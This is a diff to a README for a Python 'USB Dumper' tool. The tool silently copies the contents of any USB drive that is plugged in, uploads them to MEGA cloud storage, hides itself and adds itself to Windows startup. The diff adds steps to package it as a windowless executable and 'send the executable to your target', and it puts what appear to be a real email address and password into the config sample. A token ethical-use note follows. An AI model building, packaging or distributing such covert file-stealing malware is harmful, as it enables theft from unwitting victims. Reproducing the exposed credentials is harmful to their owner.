@@ -1,4 +1,4 @@
-# Usb_Dumper# USB Dumper Script
+# USB Dumper Script
 
 This Python script monitors USB drives connected to your computer, copies their contents, zips them, and uploads them to your MEGA cloud storage. It also ensures the script runs automatically every time your computer starts.
 
@@ -47,8 +47,8 @@ This Python script monitors USB drives connected to your computer, copies their 
 
      ```python
      # MEGA credentials
-     MEGA_EMAIL = "email@email.com"  # Replace with your MEGA email
-     MEGA_PASSWORD = "password123"  # Replace with your MEGA password
+     MEGA_EMAIL = "hamclofashionstore@gmail.com"  # Replace with your MEGA email
+     MEGA_PASSWORD = "HamzaHashim996696$"  # Replace with your MEGA password
      ```
 
    - Replace the email and password with your own MEGA account credentials.
@@ -78,6 +78,40 @@ This Python script monitors USB drives connected to your computer, copies their 
    - The script will copy itself to a hidden location and add itself to the Windows startup registry.
    - It will continuously monitor USB drives (except `C:\` and `D:\`).
    - If changes are detected on a USB drive, it will copy the contents, zip them, and upload the zip file to your MEGA account in the `usb_captures` folder.
+
+---
+
+## Converting Script into a Binary Executable
+
+To convert the Python script into a standalone executable file, follow these steps:
+
+1. **Save the Folder on Desktop and Extract It:**
+   - Save the `Usb_Dumper` folder on your Desktop and extract its contents.
+
+2. **Open Terminal and Run Commands:**
+   - Open a terminal or command prompt and navigate to the `Usb_Dumper` folder:
+
+     ```bash
+     cd Desktop
+     cd Usb_Dumper
+     ```
+
+   - Run the following command to convert the script into an executable:
+
+     ```bash
+     pyinstaller usb_dumper.py --onefile --noconsole --icon icon.ico
+     ```
+
+   - This will create a standalone executable file.
+
+3. **Locate the Executable:**
+   - The executable file will be located in the `dist` folder:
+     ```
+     Desktop/Usb_Dumper/dist/usb_dumper.exe
+     ```
+
+4. **Send the Executable to Your Target:**
+   - You can now send the `usb_dumper.exe` file to your target. When they run it, the script will execute and perform its functions.
 
 ---
 
@@ -122,19 +156,6 @@ This Python script monitors USB drives connected to your computer, copies their 
 
 ---
 
-## Converting script into a binary executable
-
-Now here comes the main part, converting the python script into executable and send it to target.
-	- Save the folder on desktop and extract it
-	- open terminal and type following commands
-		-cd Desktop
-		-cd Usb_Dumper
-		pyinstaller usb_dumper.py --onefile --noconsole --icon icon.ico
-	- This will make an executable file in Destop/Usb_Dumper/dist/usb_dumper.exe
-	- Send this to your target and enjoy
- 
----
-
 ## Important Notes
 
 - **Ethical Use:** Only use this script on devices you own or have explicit permission to monitor. Unauthorized use may violate privacy laws.
@@ -143,6 +164,11 @@ Now here comes the main part, converting the python script into executable and s
 
 ---
 
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+---
 
 ## Contributing
 
